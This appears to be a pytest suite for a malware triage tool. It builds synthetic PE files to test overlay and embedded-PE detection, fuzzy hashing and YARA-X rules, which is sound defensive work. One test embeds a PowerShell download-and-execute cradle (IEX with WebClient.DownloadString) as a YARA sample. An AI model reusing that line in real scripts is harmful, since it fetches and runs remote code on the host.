"""Phase 1 tests — deep parse (LIEF/pefile), fuzzy hash, YARA-X. Real inputs."""
import struct
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from cyphertriage import triage_bytes
from cyphertriage import executables, hashes, yara_scan
from cypherscope.findings import Verdict, Severity

lief = pytest.importorskip("lief")


def make_valid_pe(overlay: bytes = b"") -> bytes:
    """A structurally valid PE32+ that real parsers (LIEF/pefile) accept."""
    e = 0x40
    dos = b"MZ" + b"\x00" * (0x3C - 2) + struct.pack("<I", e)
    coff = struct.pack("<HHIIIHH", 0x8664, 1, 0, 0, 0, 0xF0, 0x22)
    opt = bytearray(0xF0)
    for off, fmt, val in [
        (0, "<H", 0x20B), (16, "<I", 0x1000), (20, "<I", 0x1000), (24, "<Q", 0x140000000),
        (32, "<I", 0x1000), (36, "<I", 0x200), (48, "<H", 6), (56, "<I", 0x2000),
        (60, "<I", 0x200), (68, "<H", 3), (108, "<I", 16),
    ]:
        struct.pack_into(fmt, opt, off, val)
    sd = b"\x90" * 0x200
    sec = struct.pack("<8sIIIIIIHHI", b".text", 0x200, 0x1000, len(sd), 0x200, 0, 0, 0, 0, 0x60000020)
    h = dos + b"PE\x00\x00" + coff + bytes(opt) + sec
    h += b"\x00" * (0x200 - len(h))
    return h + sd + overlay


# ── LIEF deep parse ──────────────────────────────────────────────────────────
def test_lief_parses_valid_pe_and_finds_overlay():
    overlay = b"STAGE2_" * 6
    info = executables.parse(make_valid_pe(overlay))
    assert info.ok and info.fmt == "PE"
    assert info.overlay_size == len(overlay)
    assert any(s.name == ".text" for s in info.sections)


def test_triage_uses_lief_and_reports_overlay():
    overlay = b"APPENDED_PAYLOAD_" * 4
    r = triage_bytes(make_valid_pe(overlay), "dropper.exe")
    assert "lief_deep_parse" in r.detectors_run
    ov = [f for f in r.findings if f.category == "structure.overlay"]
    assert len(ov) == 1 and ov[0].detail["overlay_size"] == len(overlay)
    assert any(c.name == "exe.overlay" and c.bits // 8 == len(overlay) for c in r.capacity.channels)
    assert r.verdict == Verdict.SUSPICIOUS


def test_clean_valid_pe_reads_clean():
    r = triage_bytes(make_valid_pe(b""), "clean.exe")
    assert not [f for f in r.findings if f.category == "structure.overlay"]
    # No malware-side alarm; cross-domain pass may add benign NOTABLE context.
    assert r.verdict in (Verdict.NO_INDICATORS, Verdict.NOTABLE)


# ── fuzzy hashing ────────────────────────────────────────────────────────────
def test_fuzzy_hash_present_and_discriminates():
    a = make_valid_pe(b"AAAA" * 50)
    b = make_valid_pe(b"AAAA" * 50 + b"x")  # tiny change
    ha, hb = hashes.fuzzy(a), hashes.fuzzy(b)
    assert ha and hb
    # Identical bytes -> perfect match; a near-duplicate -> detectably similar but
    # not identical. (ssdeep is intentionally sensitive on small inputs.)
    assert hashes.fuzzy_compare(ha, ha) == 100
    sim = hashes.fuzzy_compare(ha, hb)
    assert sim is not None and 0 < sim < 100


# ── YARA-X ───────────────────────────────────────────────────────────────────
def test_yara_flags_upx_markers():
    pytest.importorskip("yara_x")
    sample = b"\x00" * 100 + b"UPX0" + b"\x00" * 20 + b"UPX1" + b"UPX!" + b"\x00" * 100
    matches = yara_scan.scan(sample)
    assert any(m.rule == "upx_packer" for m in matches)


def test_yara_flags_powershell_download():
    pytest.importorskip("yara_x")
    sample = b"powershell IEX (New-Object Net.WebClient).DownloadString('http://x')"
    matches = yara_scan.scan(sample)
    assert any(m.rule == "suspicious_powershell_download" for m in matches)


def test_yara_match_becomes_finding_in_triage():
    pytest.importorskip("yara_x")
    # UPX markers embedded in an otherwise-valid PE body
    data = make_valid_pe(b"UPX0UPX1UPX!")
    r = triage_bytes(data, "packed.exe")
    assert any(f.category == "yara.upx_packer" for f in r.findings)


# ── calibration: signatures & validated embedded-PE (regression) ─────────────
def test_signed_system_binary_not_flagged_suspicious():
    """A signed Windows binary must NOT read SUSPICIOUS just for its signature."""
    dll = Path(r"C:\Windows\System32\kernel32.dll")
    if not dll.exists():
        pytest.skip("system binary not present")
    from cyphertriage import triage_file
    r = triage_file(str(dll))
    assert r.verdict != Verdict.SUSPICIOUS
    assert any(f.category == "structure.authenticode" for f in r.findings)
    assert not any(f.category == "structure.overlay" for f in r.findings)


def test_real_embedded_pe_is_detected():
    inner = make_valid_pe(b"")               # a full second PE...
    outer = make_valid_pe(inner)             # ...appended as the overlay
    info = executables.parse(outer)
    assert info.embedded_pe_offset == info.overlay_offset
    r = triage_bytes(outer, "carrier.exe")
    assert any(f.category == "structure.embedded_pe" for f in r.findings)
    assert r.verdict == Verdict.SUSPICIOUS


def test_find_embedded_pe_requires_valid_header():
    # Loose "MZ" + "PE" bytes with no valid e_lfanew must NOT be a match.
    loose = b"\x00" * 2000 + b"MZ garbage PE\x00\x00 more"
    assert executables.find_embedded_pe(loose, 0, len(loose)) is None
    # A genuinely valid embedded PE must be found.
    real = b"\x00" * 2000 + make_valid_pe(b"")
    assert executables.find_embedded_pe(real, 0, len(real)) == 2000


# ── honesty ──────────────────────────────────────────────────────────────────
def test_still_lists_unrun_detectors():
    # capa isn't wired yet, so it must always be surfaced as not-run. (cypherscope
    # stego/injection now DO run via the cross-domain pass, so they're not listed.)
    r = triage_bytes(make_valid_pe(), "x.exe")
    assert "capa" in r.detectors_unavailable
